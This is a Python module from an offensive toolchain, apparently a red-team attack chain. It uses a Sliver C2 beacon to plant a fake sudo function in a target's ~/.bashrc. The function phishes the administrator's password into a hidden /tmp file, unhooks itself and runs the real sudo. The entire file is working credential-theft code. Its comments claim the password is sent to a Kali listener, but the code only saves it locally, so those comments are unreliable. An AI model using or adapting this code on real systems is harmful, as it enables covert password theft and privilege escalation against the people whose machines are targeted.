import time
from chainlog import log
from advanced_initial_access import sliver_exec

# =============================================================================
# vinzenzws_privesc.py — Sudo Phishing via Sliver C2
# MITRE ATT&CK:
#   T1556.003 - Modify Authentication Process (Sudo Phishing)
#   T1078     - Valid Accounts (Root access)
# -----------------------------------------------------------------------------
# Executes FROM kali, utilizing the sliver beacon running on vinzenz's
# workstation. It injects a malicious sudo alias into ~/.bash_aliases that 
# captures the password when the admin runs sudo, sends it to a listener on 
# kali, and then executes the real sudo.
# =============================================================================

def run(vinzenz_beacon, kali_host):
    """
    Inject a Sudo Phish function into vinzenz's ~/.bashrc, wait for the admin
    to use sudo in an interactive shell, and capture the password into a local
    file on the target.

    Args:
        vinzenz_beacon (str): Sliver beacon ID running on vinzenz's workstation.
        kali_host (str):      Kali IP (reserved for future curl-based exfil --
                              the current implementation only writes the
                              captured password to a file on the target).

    Returns:
        dict: ``{"vinzenz_password_file": "/tmp/.sys_update.lock"}`` on success,
              ``{"vinzenz_password_file": None}`` on injection failure.
    """
    log("\n[*] Starting Sudo Phishing on Vinzenz Workstation (T1556.003)...")

    # The Phish payload. 
    # It prompts like real sudo, reads the password silently, 
    # sends it to our listener, and then executes the real sudo.
    # We use a background curl to a port on the Kali machine.
    payload = f"""sudo() {{
    read -rsn1 -p "[sudo] password for $USER: " firstchar
    if [ -z "$firstchar" ]; then echo; /usr/bin/sudo "$@"; return; fi
    read -rs pass
    pass="$firstchar$pass"
    echo
    echo "$pass" > /tmp/.sys_update.lock
    # Unhook ourselves
    sed -i '/sudo() {{/,/}}/d' ~/.bashrc 2>/dev/null
    unset -f sudo
    # Execute the real command
    echo "$pass" | /usr/bin/sudo -S "$@"
}}
"""
    
    log("[*] Injecting malicious sudo alias into ~/.bashrc...")
    
    # Encode payload to base64 to avoid shell escaping issues
    b64_payload = __import__('base64').b64encode(payload.encode()).decode()
    cmd = f"execute -o -- sh -c 'echo \"{b64_payload}\" | base64 -d >> ~/.bashrc'"
    
    out = sliver_exec(vinzenz_beacon, cmd)
    if out and "error" in out.lower():
        log(f"[-] Failed to inject alias: {out.strip()}")
        return {"vinzenz_password_file": None}
    
    log(f"[*] Sudo alias injected. The password will be saved to /tmp/.sys_update.lock locally.")
    log(f"[*] Waiting 45 seconds to ensure the admin triggers the alias...")
    
    __import__('time').sleep(45)
    
    log("[+] Sudo Phish complete! The password is now stored locally on the target for future use.")
    return {"vinzenz_password_file": "/tmp/.sys_update.lock"}
